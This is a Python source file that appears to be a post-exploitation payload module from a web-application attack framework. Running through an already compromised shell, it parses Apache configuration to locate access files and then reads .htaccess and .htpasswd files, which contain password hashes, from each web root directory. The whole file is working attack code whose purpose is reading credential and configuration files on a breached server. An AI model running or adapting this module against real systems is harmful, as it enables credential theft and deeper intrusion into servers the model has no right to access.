import re
from plugins.attack.payloads.base_payload import base_payload
#TODO: TEST
class apache_htaccess(base_payload):
    '''
    This payload shows Apache distributed configuration files (.htaccess & .htpasswd)
    '''
    def api_read(self):
        result = {}
        result['htaccess_files'] = {}


        def parse_htaccess(config_file):
            htaccess = re.search('(?<=AccessFileName )(.*)', config_file )
            if htaccess:
                return htaccess.group(1)
            else:
                return ''
        
        apache_config_dict = self.exec_payload('apache_config_files')
        apache_config = apache_config_dict['apache_config'].values()
        htaccess = '.htaccess'
        if apache_config:
            for file in apache_config:
                for line in file:
                    if parse_htaccess(line):
                        htaccess = parse_htaccess(line)

        
        apache_root = self.exec_payload('apache_root_directory')
        if apache_root:
            for dir in apache_root:
                htaccess_content = self.shell.read(dir+htaccess)
                if htaccess_content:
                    result['htaccess_files'] .update({dir+htaccess:htaccess_content})
                
                htpasswd_content = self.shell.read(dir+'.htpasswd')
                if htpasswd_content:
                    result['htaccess_files'] .update({dir+'.htpasswd':htpasswd_content})
        
        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        
        if hashmap:
            result.append('Apache Htaccess Files')
            for file, content in hashmap['htaccess_files'].iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        
        if result == [ ]:
            result.append('Htaccess files not found.')
        return result
